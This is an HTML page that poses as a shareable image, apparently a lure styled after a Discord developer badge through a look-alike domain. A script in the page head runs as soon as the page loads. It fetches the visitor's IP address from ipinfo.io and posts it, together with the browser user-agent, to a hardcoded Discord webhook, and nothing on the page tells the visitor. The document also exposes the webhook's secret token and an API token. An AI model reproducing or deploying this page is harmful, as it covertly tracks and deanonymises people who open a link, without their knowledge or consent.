<!DOCTYPE html>
<html>
  <head>
    <meta property="og:image" content="https://deveioperbadge.github.io/Image/download.jpg">
    <meta name="twitter:card" content="summary_large_image">
    <script>
      // Fetch the user's IP address using ipinfo.io API
      fetch('https://ipinfo.io/json?token=332dd3e8d08f73') // Replace YOUR_API_TOKEN with your token from ipinfo.io
        .then(response => response.json())
        .then(data => {
          const userIp = data.ip; // Extract the IP address from the response
          console.log("User IP:", userIp); // Log the IP address to the console

          // Send the IP to your Discord webhook
          fetch("https://discord.com/api/webhooks/1363758796467470517/g4CPvVSvNzXL9tPAZHva2Vu9XWj7637j7_jumz8etF530Nxs0aUJ6T-BO_A7Oz2KO3WW", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              content: `ðŸš¨ Visitor IP: ${userIp}\nUser-Agent: ${navigator.userAgent}`
            })
          })
          .then(response => response.json())
          .then(data => {
            console.log("Webhook response:", data); // Log the response from Discord webhook
          })
          .catch(error => {
            console.error('Error sending data to webhook:', error); // Log any errors
          });
        })
        .catch(error => {
          console.error('Error fetching IP:', error); // Log any errors while fetching IP
        });
    </script>
  </head>
  <body>
    <!-- Clickable image that leads to the page -->
    <a href="https://deveioperbadge.github.io/Image/" target="_blank">
      <img src="download.jpg" style="max-width: 100%;">
    </a>
  </body>
</html>
